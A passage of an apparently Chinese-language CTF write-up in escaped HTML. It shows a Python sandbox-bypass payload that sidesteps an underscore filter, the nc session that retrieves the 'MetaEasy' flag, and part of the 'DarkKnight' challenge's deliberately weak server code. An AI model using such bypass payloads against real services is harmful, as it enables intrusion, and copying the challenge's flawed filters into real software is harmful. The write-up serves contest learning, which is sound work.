style=\"color:#e6db74\"\u003e\u0026#34;Okay...exit...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid input.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            cnt \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"目標\"\u003e目標\u003c/h3\u003e\n\u003cp\u003e使用MasterMetaClass這個MetaClass建立一個class並調用裡面的IWantGETFLAGPlz func\u003c/p\u003e\n\u003ch3 id=\"限制\"\u003e限制\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003epayload 不可超過三行\u003c/li\u003e\n\u003cli\u003epayload 一行要低於45字\u003c/li\u003e\n\u003cli\u003epayload 不可含[\u0026rsquo; \u0026lsquo;, \u0026lsquo;_\u0026rsquo;, \u0026lsquo;$\u0026rsquo;, \u0026lsquo;#\u0026rsquo;, \u0026lsquo;@\u0026rsquo;, \u0026lsquo;~\u0026rsquo;]字元\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"payload\"\u003epayload\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python3\" data-lang=\"python3\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ea\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x5f\\x5f\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode();self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ei\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ea\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;init\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003ea\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eself\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,(MasterMetaClass,),{self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ei:print}]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003eself\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ed)(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,(),{})()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eIWantGETFLAGPlz()\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@jimmyGW:~# nc metaeasy.balsnctf.com \u003cspan style=\"color:#ae81ff\"\u003e19092\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWelcome!!We have prepared a class named \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Guest\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e you\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. Add attribute\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. Add method\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. Finish\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eOption ? :2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGive me your method name :aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGive me your \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e:a\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eb\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\x5f\\x5f\u0026#39;\u003c/span\u003e.decode\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e;self.i\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ea+\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;init\u0026#39;\u003c/span\u003e+a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. Add attribute\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. Add method\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. Finish\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eOption ? :2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGive me your method name :bbb\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGive me your \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e:self.d\u003cspan style=\"color:#f92672\"\u003e=[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eMasterMetaClass,\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e,\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003eself.i:print\u003cspan style=\"color:#f92672\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. Add attribute\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. Add method\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. Finish\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eOption ? :2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGive me your method name :ccc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGive me your \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e:type\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e*self.d\u003cspan style=\"color:#f92672\"\u003e)(\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e,\u003cspan style=\"color:#f92672\"\u003e{})()\u003c/span\u003e.IWantGETFLAGPlz\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWell Done! We Create an instance \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e you !\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. Inspect attribute\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. Using method\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. Exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eOption ? :2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePlease enter the method\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s name :aaa\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ecalling method aaa...\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003edone\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e1. Inspect attribute\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e2. Using method\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e3. Exit\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eOption ? :2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ePlease enter the method\u0026#39;\u003c/span\u003es name :bbb\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecalling method bbb...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. Inspect attribute\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. Using method\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. Exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eOption ? :2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePlease enter the method\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s name :ccc\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ecalling method ccc...\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e () {\u0026#39;\u003c/span\u003egetFlag\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;: \u0026lt;function MasterMetaClass.__new__.\u0026lt;locals\u0026gt;.getFlag at 0x7f06a60c2550\u0026gt;}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eHere you go, my master\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eBALSN{Metaclasses_Are_Deeper_Magic_Than_99%_Of_Users_Should_Ever_Worry_About._If_You_Wonder_Whether_You_Need_Them,_You_Don\u0026#39;\u003c/span\u003et.-Tim_Peters_DE8560A2\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag\"\u003eflag\u003c/h3\u003e\n\u003cp\u003eBALSN{Metaclasses_Are_Deeper_Magic_Than_99%_Of_Users_Should_Ever_Worry_About._If_You_Wonder_Whether_You_Need_Them,_You_Don\u0026rsquo;t.-Tim_Peters_DE8560A2}\u003c/p\u003e\n\u003ch3 id=\"參考\"\u003e參考\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://dboyliao.medium.com/%E6%B7%BA%E8%AB%87-python-metaclass-dfacf24d6dd5\"\u003e淺談 Python Metaclass\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"darkknight\"\u003eDarkKnight\u003c/h2\u003e\n\u003ch3 id=\"題目-1\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795120-ce0a446a-5e10-4998-bd33-1f72ad9d4eea.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"server-code-1\"\u003eserver code\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python3\" data-lang=\"python3\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e os\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e shutil\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebase_dir \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;C:\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eUsers\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ebalsnctf\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eDocuments\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eDark Knight\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etmp-\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eos\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurandom(\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehex()\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003einit\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    os\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emkdir(base_dir)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    os\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003echdir(base_dir)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;39671\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;alice\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ealice1025\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;683077\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bob\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ebob0105a\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epassword_manager\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;use a short pin code to achieve fast login!!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        pin \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enter a pin code \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(pin) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;too long...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;..\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;what do you want to do?(¬_¬)\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        flag \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;utf8\u0026#34;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x7e\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;printable chars only!!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                flag \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e flag:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        username \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enter username \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(username) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;too long...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e username\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;utf8\u0026#34;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x7e\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;printable chars only!!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                flag \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e flag:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        password \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enter password \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(password) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan 